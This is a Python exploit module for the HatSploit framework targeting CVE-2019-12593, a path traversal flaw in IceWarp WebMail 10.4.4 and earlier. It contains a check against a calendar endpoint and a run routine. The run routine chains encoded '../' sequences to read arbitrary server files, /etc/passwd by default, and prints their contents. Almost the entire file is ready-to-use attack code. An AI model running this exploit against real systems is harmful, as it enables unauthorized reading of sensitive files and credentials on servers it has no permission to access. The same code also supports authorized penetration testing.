"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import HTTP


class HatSploitModule(Module, HTTP):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "IceWarp WebMail Path Traversal",
            'Module': "exploit/generic/icewarp/webmail_path_traversal",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
                "Jameel Nabbo (JameelNabbo) - vulnerability researcher",
            ],
            'Description': """
                IceWarp WebMail server has a vulnerability exploitation of which
                leading to a path traversal.
            """,
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'Targets': {
                'IceWarp <= 10.4.4 (Linux)': {
                    'Postfix': '%2f'
                },
                'IceWarp <= 10.4.4 (Windows)': {
                    'Postfix': '%5c'
                }
            },
            'References': [
                {'URL': 'https://nvd.nist.gov/vuln/detail/CVE-2019-12593'},
                {'URL': 'https://www.exploit-db.com/exploits/46959'},
                {'CVE': '2019-12593'},
                {'EDB': 46959}
            ],
            'DisclosureDate': "2019-06-03",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [],
                'SideEffects': [],
            }
        })

        self.file = Option('FILE', "/etc/passwd", "File to read.", True)

    def check(self):
        response = self.http_request(
            method="GET",
            path='/webmail/calendar/minimizer/index.php',
        )

        if response and response.status_code == 200:
            return True

        return False

    def run(self):
        path = f"..{self.target['Postfix']}" * 8
        response = self.http_request(
            method="GET",
            path=f'{path}{self.file.value}',
        )

        if response.text:
            self.print_empty(f"\n{response.text}")
        else:
            self.print_warning("File is empty.")
